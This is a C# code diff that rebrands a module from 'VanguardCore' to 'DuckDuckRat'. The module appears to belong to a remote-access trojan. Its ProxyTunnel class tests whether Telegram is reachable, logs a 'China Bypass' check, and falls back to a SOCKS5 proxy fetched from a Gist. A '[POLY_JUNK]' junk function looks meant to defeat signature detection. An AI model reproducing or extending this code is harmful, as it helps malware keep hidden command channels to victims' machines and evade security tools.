@@ -3,14 +3,14 @@ using System.Net;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Diagnostics;
-using VanguardCore;
+using DuckDuckRat;
 
-namespace VanguardCore.Modules
+namespace DuckDuckRat.Modules
 {
     public static class ProxyTunnel
     {
         // [POLY_JUNK]
-        private static void _vanguard_bc8cae3f() {
+        private static void _DuckDuckRat_bc8cae3f() {
             int val = 56824;
             if (val > 50000) Console.WriteLine("Hash:" + 56824);
         }
@@ -19,16 +19,16 @@ namespace VanguardCore.Modules
 
         public static async Task<HttpClient> GetBestHttpClient()
         {
-            FinalBot.Logger.Info("[PROXY] Connectivity check (China Bypass)...");
+            DuckDuckRat.Logger.Info("[PROXY] Connectivity check (China Bypass)...");
             // 1. Try direct connection
             if (await TestTelegramConnectivity(null))
             {
-                FinalBot.Logger.Info("[PROXY] Direct connection OK.");
+                DuckDuckRat.Logger.Info("[PROXY] Direct connection OK.");
                 return new HttpClient();
             }
 
             // 2. Try proxy from Gist
-            FinalBot.Logger.Warn("[PROXY] Direct connection failed. Fetching proxy from Gist...");
+            DuckDuckRat.Logger.Warn("[PROXY] Direct connection failed. Fetching proxy from Gist...");
             string gistProxy = await GistManager.GetFileContent("proxies.json");
             
             if (!string.IsNullOrEmpty(gistProxy))
@@ -36,16 +36,16 @@ namespace VanguardCore.Modules
                 // Ensure protocol prefix
                 if (!gistProxy.Contains("://")) gistProxy = "socks5://" + gistProxy;
                 
-                FinalBot.Logger.Info($"[PROXY] Testing Gist Proxy: {gistProxy}");
+                DuckDuckRat.Logger.Info($"[PROXY] Testing Gist Proxy: {gistProxy}");
                 if (await TestTelegramConnectivity(gistProxy))
                 {
-                    FinalBot.Logger.Info("[PROXY] Gist Proxy is WORKING.");
+                    DuckDuckRat.Logger.Info("[PROXY] Gist Proxy is WORKING.");
                     _currentProxy = gistProxy;
                     return CreateProxiedClient(gistProxy);
                 }
             }
 
-            FinalBot.Logger.Error("[PROXY] All connectivity attempts failed.");
+            DuckDuckRat.Logger.Error("[PROXY] All connectivity attempts failed.");
             return new HttpClient();
         }
 
@@ -80,3 +80,5 @@ namespace VanguardCore.Modules
         }
     }
 }
+
+
